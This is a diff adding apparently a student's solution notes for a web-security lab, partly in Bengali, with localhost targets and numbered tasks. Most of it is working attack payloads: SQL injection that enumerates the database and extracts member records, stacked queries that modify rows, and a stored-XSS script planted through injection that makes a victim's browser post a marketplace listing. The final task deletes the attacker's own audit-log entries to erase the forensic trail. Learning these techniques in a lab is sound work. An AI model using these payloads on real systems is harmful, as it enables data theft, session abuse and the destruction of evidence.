@@ -1,0 +1,149 @@
+4100001
+rahman-41
+
+4100002 
+karim-41
+
+1.
+rahman-41' AND '1' = '1
+rahman-41' AND '1' = '0
+
+2.
+rahman-41' order by 1 limit 1 -- -
+1 , 2, ... check. 5 e paina kichu.
+//4 ta colm
+
+' union select 1,2,3,4 -- -
+//2,3,4 dekhay
+
+DB _name : a1_fines
+' union select 1,'',DATABASE(),4 -- -
+
+shob table dekhte :
+' union select 1,'',GROUP_CONCAT(table_name),4 from information_schema.tables where table_schema = DATABASE() -- -
+tables : fine_record, log, member
+
+column name :
+' union select 1,'',GROUP_CONCAT(column_name),4 from information_schema.columns where table_name = 'fine_record' -- -
+fine_record table colm : amount,fine_id,member_id,reason,status
+log : attempted_at,id,submitted_id,submitted_secret
+member : first_name,last_name,member_id,pin
+
+status e koyta distinct var ase :
+' union select 1,'',GROUP_CONCAT(DISTINCT status),4 FROM fine_record -- -
+
+3.
+Extract every member's ID, name, and total
+unpaid amount through the vulnerable p ortal. 
+Correctly aggregate multiple records and include
+zero-total memb ers.
+
+
+
+' union select 1,'',
+GROUP_CONCAT(t.member_id,', ',t.first_name,', ',t.last_name,' : $',t.total SEPARATOR '<br>'),4
+FROM (
+SELECT m.member_id AS member_id, m.first_name AS first_name, m.last_name AS last_name,
+        COALESCE(SUM(CASE WHEN f.status='UNPAID' THEN f.amount ELSE 0 END),0) AS total
+FROM member m LEFT JOIN fine_record f ON f.member_id=m.member_id
+GROUP BY m.member_id, m.first_name, m.last_name
+) t -- -
+
+
+"members with no unpaid fines must still appear with a zero total." COALESCE(..., 0) catches that NULL and substitutes 0 in its place.
+
+
+
+4.Use a stacked statement through the PIN input to
+persist a stored-XSS payload in the attacker's 
+own member record
+
+member table : first_name,last_name,member_id,pin
+
+rahman-41'; UPDATE member SET last_name='RahmanTEST' WHERE member_id=4100001; -- -
+' union select 1,'<b>bold</b>','test',4 -- -
+
+
+5.
+With the attacker logged in to the Marketplace, a
+normal check of the attacker's fune balance must create 
+the exact required listing and numeric
+price without a separate post action. The final amount 
+must be calculated from the database by
+the exploit
+
+market place e anika hishebe login:
+post request , then network er post e copy as fetch:
+await fetch("http://localhost:4001/list", {
+    "credentials": "include",
+    "headers": {
+        "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:147.0) Gecko/20100101 Firefox/147.0",
+        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Content-Type": "application/x-www-form-urlencoded",
+        "Upgrade-Insecure-Requests": "1",
+        "Sec-Fetch-Dest": "document",
+        "Sec-Fetch-Mode": "navigate",
+        "Sec-Fetch-Site": "same-origin",
+        "Sec-Fetch-User": "?1",
+        "Priority": "u=0, i"
+    },
+    "referrer": "http://localhost:4001/",
+    "body": "title=test2&price=200",
+    "method": "POST",
+    "mode": "cors"
+});
+
+console e paste :
+await fetch("http://localhost:4001/list", {
+    "credentials": "include",
+    "headers": {
+        "Content-Type": "application/x-www-form-urlencoded"
+    },
+    "body": "title=test3&price=300",
+    "method": "POST"
+});
+
+
+
+log into Marketplace as anika.rahman, reload fines page as 4100001 and this password
+
+fine page er 
+id : 4100001
+pasword : 
+
+rahman-41'; UPDATE member SET last_name = CONCAT(
+'<script>fetch("http://localhost:4001/list", {"headers": {"content-type": "application/x-www-form-urlencoded"}, "body": "title=I+owe+%24',
+(SELECT COALESCE(SUM(CASE WHEN status='UNPAID' THEN amount ELSE 0 END),0) FROM fine_record WHERE member_id=4100001),
+'+in+fines&price=',
+(SELECT COALESCE(SUM(CASE WHEN status='UNPAID' THEN amount ELSE 0 END),0) FROM fine_record WHERE member_id=4100001),
+'", "method": "POST", "credentials": "include"});</script>'
+) WHERE member_id=4100001; -- -
+
+
+%24 hocche $ er encrypted representation
+& separator, newline banay
+title = I owe $20.25 in fines
+price = 20.25 evabe print
+
+
+
+6.
+Discover the forensic trail left by portal submissions and,
+through the same injection channel, delete only 
+the trail attributable to member 4100001.
+Evidence belonging to every other memb er must remain intact
+
+
+fine_record table colm : amount,fine_id,member_id,reason,status
+log : attempted_at,id,submitted_id,submitted_secret
+member : first_name,last_name,member_id,pin
+
+
+' union select 1,'',GROUP_CONCAT(column_name),4 FROM information_schema.columns WHERE table_name='log' -- -
+rahman-41'; DELETE FROM log WHERE submitted_id=4100001; -- -
+
+
+
+
+
